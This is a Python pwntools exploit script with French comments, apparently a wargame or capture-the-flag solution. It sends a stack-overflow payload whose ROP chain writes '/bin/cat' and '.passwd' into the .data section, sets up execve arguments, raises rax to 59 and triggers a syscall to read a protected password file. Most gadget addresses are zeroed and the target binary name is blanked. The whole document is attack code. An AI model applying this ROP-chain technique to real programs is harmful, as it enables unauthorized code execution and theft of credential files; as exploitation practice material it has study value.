#coding: utf-8

from pwn import *
from struct import pack

r = process("?????")

p = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2A"

#:wqOn place l'adresse du debut de .data dans rdx
p += pack('<Q', 0x0000000000000000) # pop rdx ; ret
p += pack('<Q', 0x0000000000000000)

#on place la chaine "/bin" dans ecx
p += pack('<Q', 0x0000000000000000) #pop rcx ; ret
p += '/bin\0\0\0\0'

#On ecrit /bin dans data:
p += pack('<Q', 0x0000000000000000) #mov dword ptr [rdx], ecx ; ret

#On place l'adresse du debut de .data + 4 dans rdx
p += pack('<Q', 0x0000000000000000) # pop rdx ; ret
p += pack('<Q', 0x0000000000000000)

#on place la chaine "/cat" dans ecx
p += pack('<Q', 0x0000000000000000) #pop rcx ; ret
p += '/cat\0\0\0\0'

#On ecrit /cat dans data:
p += pack('<Q', 0x0000000000000000) #mov dword ptr [rdx], ecx ; ret
####################################################################

#now on ecris .passwd

#On place l'adresse du debut de .data + 9 dans rdx
p += pack('<Q', 0x0000000000000000) # pop rdx ; ret
p += pack('<Q', 0x0000000000000000)
#on place la chaine ".pas" dans ecx
p += pack('<Q', 0x0000000000000000) #pop rcx ; ret
p += '.pas\0\0\0\0'
#On ecrit .pas dans data:
p += pack('<Q', 0x0000000000000000) #mov dword ptr [rdx], ecx ; ret

#on ecrit swd\0 a .data + 9 + 4
p += pack('<Q', 0x0000000000000000) # pop rdx ; ret
p += pack('<Q', 0x0000000000000000)
#on place la chaine "swd" dans ecx
p += pack('<Q', 0x0000000000000000) #pop rcx ; ret
p += 'swd\0\0\0\0\0'
#On ecrit .swd dans data:
p += pack('<Q', 0x000000000040e8f4) #mov dword ptr [rdx], ecx ; ret

###############################################
#on place l'adresse de data dans .data + 9 + 5

#On place l'adresse du debut de .data + 9  + 5dans rdx
p += pack('<Q', 0x0000000000000000) # pop rdx ; ret
p += pack('<Q', 0x0000000000000000)
#on place les 4 dernier digits de l'adress de .data dans ecx
p += pack('<Q', 0x0000000000000000) #pop rcx ; ret
p += '\x00\x00\x6c\x00\0\0\0\0'
#on ecrit ca dans .data + 9 + 5
p += pack('<Q', 0x0000000000000000) #mov dword ptr [rdx], ecx ; ret

#On place l'adresse du debut de .data + 9  + 9 dans rdx
p += pack('<Q', 0x0000000000000000) # pop rdx ; ret
p += pack('<Q', 0x0000000000000000)
#on place les 4 dernier digits de l'adress de .data dans ecx
p += pack('<Q', 0x0000000000000000) #pop rcx ; ret
p += '\x00\x00\x00\x00\0\0\0\0'
#on ecrit ca dans .data + 9 + 9
p += pack('<Q', 0x0000000000000000) #mov dword ptr [rdx], ecx ; ret


#On place l'adresse de la deuxieme string dans rdx
p += pack('<Q', 0x0000000000000000) # pop rdx ; ret
p += pack('<Q', 0x0000000000000000)
#on place les 4 dernier digits de l'adress de la deuxieme string dans ecx
p += pack('<Q', 0x0000000000000000) #pop rcx ; ret
p += '\x09\x00\x6c\x00\0\0\0\0'
#on ecrit ca dans .data + 9 + 9
p += pack('<Q', 0x0000000000000000) #mov dword ptr [rdx], ecx ; ret


#On place l'adresse de la deuxieme string dans rdx
p += pack('<Q', 0x0000000000000000) # pop rdx ; ret
p += pack('<Q', 0x0000000000000000)
#on place les 4 dernier digits de l'adress de la deuxieme string dans ecx
p += pack('<Q', 0x0000000000000000) #pop rcx ; ret
p += '\x00\x00\x00\x00\0\0\0\0'
#on ecrit ca dans .data + 9 + 9
p += pack('<Q', 0x0000000000000000) #mov dword ptr [rdx], ecx ; ret


#on place l'adresse de data dans rdi (1er arg)
p += pack('<Q', 0x0000000000000000) #pop rdi ; ret
p += pack('<Q', 0x0000000000000000)

#on met rsi a 0
p += pack('<Q', 0x0000000000000000) #pop rsi ; ret
p += pack('<Q', 0x0000000000000000)

#on met rdx a 0
p += pack('<Q', 0x0000000000000000)
p += pack('<Q', 0x0000000000000000)

#on met rax a 0
p += pack('<Q', 0x0000000000000000) #xor rax, rax ; ret

for i in range(59):
    p += pack('<Q', 0x0000000000000000) # add rax, 1 ; ret

p += pack('<Q', 0x0000000000000000) #syscall

f = open('/tmp/file1', 'w')
f.write(p)
f.close()

r.sendline(p)

r.interactive()

